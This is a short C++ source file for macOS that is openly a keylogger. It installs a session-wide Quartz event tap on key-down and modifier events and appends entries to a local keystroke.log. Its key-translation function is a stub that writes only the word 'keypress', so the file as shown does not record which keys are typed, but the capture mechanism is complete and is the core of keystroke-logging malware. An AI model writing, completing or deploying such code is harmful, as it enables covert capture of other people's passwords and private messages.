#include <iostream>
#include <stdio.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

using namespace std;

FILE *logfile = NULL;
CGEventRef CGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int);

int main(int argc, const char *argv[]) {

    CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, &flags);

    if(!eventTap) {
        cout << "You need to enable \"Enable access for assistive devices\" in the System Preferences Accessibility panel." << endl;
        exit(1);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    const char *logfileLocation = "./keystroke.log";
    logfile = fopen(logfileLocation, "a");
    fprintf(logfile, "Keylogging has begun.\n\n");
    CFRunLoopRun();

    return 0;
}

CGEventRef CGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) { 
        return event;
    }
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    fprintf(logfile, "%s", convertKeyCode(keyCode));
    return event;
}

const char *convertKeyCode(int keyCode) {
    return "keypress";
}